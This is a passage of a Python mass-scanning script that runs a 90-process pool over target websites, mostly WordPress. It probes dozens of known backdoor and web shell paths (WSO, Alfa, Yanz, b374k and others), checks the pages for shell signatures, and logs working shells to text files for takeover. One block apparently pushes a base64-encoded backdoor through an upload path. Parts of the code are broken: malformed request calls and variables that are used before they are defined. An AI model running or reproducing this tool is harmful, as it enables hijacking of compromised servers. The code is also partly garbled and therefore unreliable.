        check = requests.get(url+'/wp-content/themes/mero-magazine/ws.php',headers=headers, allow_redirects=True,timeout=15)
        if " - WSO 5.5</title>" in check.content:
                print '-| ' + url + ('--> {}[Succefully]').format(fg)
                open('Shells.txt', 'a').write(url + '/wp-content/themes/mero-magazine/ws.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/mero-magazine/ws.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if " - WSO 5.5</title>" in check.content:
                    print '-| ' + url + ('--> {}[Succefully]').format(fg)
                    open('Shells.txt', 'a').write(url + '/wp-content/themes/mero-magazine/ws.php\n')
            else:
                print '-| ' + url + ('>{}[Failed]').format(fr)
    except :
        print '-| ' + url + ('>{}[Failed]').format(fr)
        
def exploit_1(url):
 
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 1 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m')
                open('shells.txt', 'a').write(url + '/RxR.php?Fox=efjiq\\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 1 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m')
                    open('shells.txt', 'a').write(url + '/RxR.php?Fox=efjiq\\n')
            else:
                print ('[#] Exploit 1 --> ' + url + ' \\u001b[31m[Failed]\\033[0m')
    except:
        print ('[#] Dead --> ' + url ) 

def exploit_2(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cgi-bin/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 2 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m')
                open('shells.txt', 'a').write(url + '/cgi-bin/RxR.php?Fox=efjiq\\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cgi-bin/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 2 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m')
                    open('shells.txt', 'a').write(url + '/cgi-bin/RxR.php?Fox=efjiq\\n')
            else:
                print ('[#] Exploit 2 --> ' + url  + ' \\u001b[31m[Failed]\\033[0m')
    except:
        print ('[#] Dead --> ' + url)
#
def exploit_3(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/blog/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 3 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m')
                open('shells.txt', 'a').write(url + '/blog/RxR.php?Fox=efjiq\\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/blog/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 3 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m') 
                    open('shells.txt', 'a').write(url + '/blog/RxR.php?Fox=efjiq\\n')
            else:
                print ('[#] Exploit 3 --> ' + url + ' \\u001b[31m[Failed]\\033[0m')
    except:
        print ('[#] Dead --> ' + url ) 
#
def exploit_4(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cgi-bin/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 4 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m')
                open('shells.txt', 'a').write(url + '/cgi-bin/mt/RxR.php?Fox=efjiq\\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cgi-bin/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 4 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m')
                    open('shells.txt', 'a').write(url + '/cgi-bin/mt/RxR.php?Fox=efjiq\\n')
            else:
                print ('[#] Exploit 4 --> ' + url + ' \\u001b[31m[Failed]\\033[0m')
    except:
        print ('\\033[0;31m[#] Dead --> ' + url)  
#
def exploit_5(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cms/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 5 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m') 
                open('shells.txt', 'a').write(url + '/cms/RxR.php?Fox=efjiq\\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cms/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 5 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m')
                    open('shells.txt', 'a').write(url + '/cms/RxR.php?Fox=efjiq\\n')
            else:
                print ('[#] Exploit 5 --> ' + url + ' \\u001b[31m[Failed]\\033[0m')
    except:
        print ('[#] Dead --> ' + url) 
#
def exploit_6(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/mtos/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 6 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m') 
                open('shells.txt', 'a').write(url + '/mtos/RxR.php?Fox=efjiq\\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/mtos/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 6 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m')
                    open('shells.txt', 'a').write(url + '/mtos/RxR.php?Fox=efjiq\\n')
            else:
                print ('[#] Exploit 6 --> ' + url + ' \\u001b[31m[Failed]\\033[0m')
    except:
        print ('[#] Dead --> ' + url ) 
#
def exploit_7(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 7 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m')
                open('shells.txt', 'a').write(url + '/mt/RxR.php?Fox=efjiq\\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 7 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m')
                    open('shells.txt', 'a').write(url + '/mt/RxR.php?Fox=efjiq\\n')
            else:
                print ('[#] Exploit 7 --> ' + url + ' \\u001b[31m[Failed]\\033[0m')
    except:
        print ('[#] Dead --> ' + url ) 
#
def exploit_8(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/MT/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 8 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m')
                open('shells.txt', 'a').write(url + '/MT/RxR.php?Fox=efjiq\\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/MT/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 8 --> ' + url + ' \\u001b[32m[Succefully]\\033[0m')
                    open('shells.txt', 'a').write(url + '/MT/RxR.php?Fox=efjiq\\n')
            else:
                print ('[#] Exploit 8 --> ' + url + ' \\u001b[31m[Failed]\\033[0m')
    except:
        print ('[#] Dead --> ' + url ) 
        
def asrul(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/alfa-rex.php',headers=headers, allow_redirects=True,timeout=15)
        if '<b>Yanz Webshell!</b>' in check.content:
                print ' :D ' + url + ' -> {}[succes]'.format(fg)
                open('Shells.txt', 'a').write(url + '/alfa-rex.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/.well-known/pki-validation/cloud.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Shell Bypass 403 GE-C666C' in check.content:
                    print ' :D ' + url + ' -> {}[succes]'.format(fg)
                    open('Shells.txt', 'a').write(url + '/.well-known/pki-validation/cloud.php\n')
            else:
                print ' :( ' + url + ' --> {}[Failed]'.format(fr)
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/applica/400.php',headers=headers, allow_redirects=True,timeout=15)
        if '#wp_config_error#' in check.content:
                print ' :D ' + url + ' -> {}[succes]'.format(fg)
                open('Shells.txt', 'a').write(url + '/wp-content/themes/applica/400.php\n')
        else:
            url = 'https://' + URLdomain(url)
        check = requests.get(url+'/repeater.php',headers=headers, allow_redirects=True,timeout=15)
        if '<b>Yanz Webshell!</b>' in check.content:
                print ' :D ' + url + ' -> {}[succes]'.format(fg)
                open('Shells.txt', 'a').write(url + '/repeater.php\n')
        else:
            url = 'https://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/js/widgets/about.php7',headers=headers, allow_redirects=True,timeout=15)
        if '<b>Yanz Webshell!</b>' in check.content:
                print ' :D ' + url + ' -> {}[succes]'.format(fg)
                open('Shells.txt', 'a').write(url + '/wp-admin/js/widgets/about.php7\n')
        else:
                print ' :( ' + url + ' -> {}[Failed]'.format(fr)
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/alfa-rex.php7',headers=headers, allow_redirects=True,timeout=15)
        if '<b>Yanz Webshell!</b>' in check.content:
                print ' :D ' + url + ' -> {}[succes]'.format(fg)
                open('Shells.txt', 'a').write(url + '/alfa-rex.php7\n')
        else:
            print ' :( ' + url + ' -> {}[Failed]'.format(fr)
            url = 'https://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/theme-compat/wp-conflg.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
        if '@Ghazascanner_2019runbot' in check.content:
                print ' :D ' + url + ' -> {}[succes]'.format(fg)
                open('Shells.txt', 'a').write(url + '/wp-includes/theme-compat/wp-conflg.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/js/about.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<b>Yanz Webshell!</b>' in check.content:
                    print ' -| ' + url + ' -> {}[succes]'.format(fg)
                    open('Shells.txt', 'a').write(url + '/wp-admin/js/about.php\n')
            else:
                print ' -| ' + url + ' -> {}[Failed]'.format(fr)
    except :
        print ' :( ' + url + ' -> {}[Failed]'.format(fr)
        
def primidag(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/themes/pridmag/db.php?u', headers=headers, allow_redirects=True, timeout=15)
        if 'input name="_upl" type="submit" id="_upl" value="Upload"' in check.content:
            print ' -> ' + url + (' --> {}[Succes]').format(fg)
            open('ok.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/themes/pridmag/db.php?u', headers=headers, allow_redirects=True, verify=False, timeout=15)
            if 'input name="_upl" type="submit" id="_upl" value="Upload"' in check.content:
                print ' -> ' + url + (' --> {}[Succes]').format(fg)
                open('ok.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
            else:
                print ' -> ' + url + (' --> {}[Failed]').format(fr)
    except:
        print ' -> ' + url + (' --> {}[Failed]').format(fr)
     
def gaskan(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/anttt/simple.php',headers=headers, allow_redirects=True,timeout=15)
        if 'input type="file" id="inputfile" name="inputfile"' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('simple.txt', 'a').write(url + '/wp-content/plugins/anttt/simple.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/TOPXOH/wDR.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('wso.txt', 'a').write(url + '/wp-content/plugins/TOPXOH/wDR.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/wordpresss3cll/up.php',headers=headers, allow_redirects=True,timeout=15)
        if 'enctype="multipart/form-data"><input type="file" name="btul"><button>Gaskan<' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('GaskanShells.txt', 'a').write(url + '/wp-content/plugins/wordpresss3cll/up.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/wp-file-upload/ROOBOTS.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Upl0od Your T0ols' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('ROOBOTS.txt', 'a').write(url + '/wp-content/plugins/wp-file-upload/ROOBOTS.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

def lastgbac(url):
    try:
        url_https = 'https://' + code_shell.url_domain(url)
        url_http = 'http://' + code_shell.url_domain(url)

        # Check for mar.php
        check = requests.get(url_https + '/wp-content/plugins/yyobang/mar.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('mar.txt', 'a').write(url_https + '/wp-content/plugins/yyobang/mar.php\n')
        else:
            print(' -| ' + url_https + ' --> [Failed]')

        # Check for wp-class.php
        check = requests.get(url_http + '/wp-content/plugins/press/wp-class.php', headers=code_shell.headers, allow_redirects=True, timeout=15)
        if 'WSO 4.2.5' in check.text:
            print(' -| ' + url_http + ' --> [Successfully]')
            open('wso-shell1.txt', 'a').write(url_http + '/wp-content/plugins/press/wp-class.php\n')

        # Check for xxl.php
        check = requests.get(url_https + '/xxl.php', headers=code_shell.headers, allow_redirects=True, timeout=15)
        if '<pre align=center><form method=post>Password<br><input type=password name=pass' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('xxl.txt', 'a').write(url_https + '/xxl.php\n')

        # Check for fm1.php
        check = requests.get(url_http + '/fm1.php', headers=code_shell.headers, allow_redirects=True, timeout=15)
        if 'Uname:' in check.text:
            print(' -| ' + url_http + ' --> [Successfully]')
            open('fm1.txt', 'a').write(url_http + '/fm1.php\n')

        # Check for min.php
        check = requests.get(url_https + '/wp-content/themes/finley/min.php', headers=code_shell.headers, allow_redirects=True, timeout=15)
        if 'Yanz Webshell!' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('yanzz.txt', 'a').write(url_https + '/wp-content/themes/finley/min.php\n')

        # Check for M1.php
        check = requests.get(url_https + '/M1.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Madstore.sk!' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('m1.txt', 'a').write(url_https + '/M1.php\n')

        # Check for wp-head.php
        check = requests.get(url_https + '/wp-head.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Yanz Webshell!' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('yanzz.txt', 'a').write(url_https + '/wp-head.php\n')

        # Check for class.api.php
        check = requests.get(url_https + '/class.api.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if '%PDF-0-1<form action="" method="post"><input type="text" name="_rg"><input type="submit" value=">>"' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('clas.api.txt', 'a').write(url_https + '/class.api.php\n')
            
        # Check for nice.php
        check = requests.get(url_https + '/nice.php?p=', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'type="button">Upload File<' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('nice.txt', 'a').write(url_https + '/nice.php?p=\n')
            
        # Check for lmao
        check = requests.get(url_https + '/.well-known/index.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'input type="text" readonly="1" id="upload_visible"' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('index.txt', 'a').write(url_https + '/.well-known/index.php\n')
            
        # Check for alfa.php
        check = requests.get(url_https + '/.well-known/admin.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'ALFA TEaM Shell - v4.1-Tesla' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('alfa.txt', 'a').write(url_https + '/.well-known/admin.php\n')
            
        # Check for alfa.php
        check = requests.get(url_https + '/.well-known/acme-challenge/wp-signup.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'ALFA TEaM Shell - v4.1-Tesla' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('alfanew.txt', 'a').write(url_https + '/.well-known/acme-challenge/wp-signup.php\n')
            
        # Check for moon.php
        check = requests.get(url_https + '/wp-admin/images/moon.php','.well-known/acme-challenge/moon.php','cgi-bin/moon.php','wp-admin/js/widgets/moon.php','wp-admin/maint/moon.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if'<title>Gel4y Mini Shell</title>' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('gelay.txt', 'a').write(url_https + 'wp-admin/images/moon.php','.well-known/acme-challenge/moon.php','cgi-bin/moon.php','wp-admin/js/widgets/moon.php','wp-admin/maint/moon.php\n')
            
        # Check for ioptimization
        check = requests.get(url_https + '/wp-content/plugins/ioptimization/IOptimize.php?rchk', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'type="file"><input type="submit" value="Upload"' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('ioptimize.txt', 'a').write(url_https + '/wp-content/plugins/ioptimization/IOptimize.php?rchk\n')
            
        # Check for db.php
        check = requests.get(url_https + '/wp-content/themes/seotheme/db.php?u', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'input name="_upl" type="submit" id="_upl" value="Upload"' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('db.txt', 'a').write(url_https + '/wp-content/themes/seotheme/db.php?u\n')
            
        # Check for include.php
        check = requests.get(url_https + '/wp-content/plugins/core-plugin/include.php#admin', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if "<input type=submit name='watching' value='submit' style=" in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('include.txt', 'a').write(url_https + '/wp-content/plugins/core-plugin/include.php#admin\n')
            
        # Check for wppler
        check = requests.get(url_https + '/wp-content/plugins/w0rdpr3ssnew/wp-login.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Public Shell Version 2.0' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('public.txt', 'a').write(url_https + '/wp-content/plugins/w0rdpr3ssnew/wp-login.php\n')
            
        # Check for wpkontol
        check = requests.get(url_https + '/wp-content/plugins/w0rdpr3ssnew/about.phpp', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Faizzz-Chin ShellXploit' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('faizz.txt', 'a').write(url_https + '/wp-content/plugins/w0rdpr3ssnew/about.phpp\n')
            
        # Check for wpkontol
        check = requests.get(url_https + '/wp-content/uploads/gravity_forms/e/d/f/c/kontol.php?wall=', + encoded_php, headers=self.headers).content.decode()
        encoded_php = base64.b64encode(backdoors.encode()).decode()
        if 'Uname:' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('newexploit.txt', 'a').write(url_https + "/wp-content/uploads/gravity_forms/e/d/f/c/" + filename + "\n")
            
        # Check for wpkontol
        check = requests.get(url_https + '/radio.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'BlackDragon' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('radio.txt', 'a').write(url_https + '/radio.php\n')
            
        # Check for wpkontol
        check = requests.get(url_https + '/cong.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Mr.Combet WebShell' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('combet.txt', 'a').write(url_https + '/cong.php\n')
            
        # Check for wpkontol
        check = requests.get(url_https + '/wp-content/themes/twentyfive/include.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'b374k 2.8' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('b374k.txt', 'a').write(url_https + '/wp-content/themes/twentyfive/include.php\n')
            
        # Check for wpkontol
        check = requests.get(url_https + '/.well-known/acme-challenge/index.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if '>Upload: <input type="hidden" value="100000000" name="MAX_FILE_SIZE"><input type="file" name="upfile" id="ltb">' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('index-shell.txt', 'a').write(url_https + '/.well-known/acme-challenge/index.php\n')
            
        # Check for wpkontol
        check = requests.get(url_https + '/css/index.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'L I E R SHELL' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('lier-shell.txt', 'a').write(url_https + '/css/index.php\n')
            
        # Check for wpkontol
        check = requests.get(url_https + '/wp-includes/js/tinymce/skins/lightgray/img/index.php?p=', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Tiny File Manager' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('tainy.txt', 'a').write(url_https + '/wp-includes/js/tinymce/skins/lightgray/img/index.php?p=\n')
            
        # Check for wpkontol
        check = requests.get(url_https + '/wp-content/plugins/wordpresss3cll/includes.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'meta name="robots" content="noindex"><form method="post" enctype="multipart/form-data"><input type="file" name="btul"><button>Gaskan<' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('gataul.txt', 'a').write(url_https + '/wp-content/plugins/wordpresss3cll/includes.php\n')
            
        # Check for wpkontol
        check = requests.get(url_https + '/wp-content/plugins/wordpresss3cll/wp-login.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'C0mmand ' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('shell-rawr.txt', 'a').write(url_https + '/wp-content/plugins/wordpresss3cll/wp-login.php\n')
            
        # Check for malesanjg
        check = requests.get(url_https + '/wp-admin/network/upfile.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'kill_the_net' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('shell-kill.txt', 'a').write(url_https + '//wp-admin/network/upfile.php\n')

    except Exception as e:
        print(' -| ' + url + ' --> [Failed]:')


def run_exp(url):
    try:
        code_shell.ba_blue(url)
        multiblackbot(url)
        lastgbac(url)
        raditya(url)
        dandier(url)
        show(url)
        FourHundredThree(url)
        ya(url)
        rawr(url)
        dia(url)
        Exploiter(url)
        loalah(url)
        backdoor1(url)
        backdoor2(url)
        gadaa(url)
        pelisa(url)
        exploit_1(url)
        exploit_2(url)
        exploit_3(url)
        exploit_4(url)
        exploit_5(url)
        exploit_6(url)
        exploit_7(url)
        exploit_8(url)
        asrul(url)
        primidag(url)
        gaskan(url)
        

    except:
        pass

mp = Pool(90)
mp.map(run_exp, target)
mp.close()
mp.join()

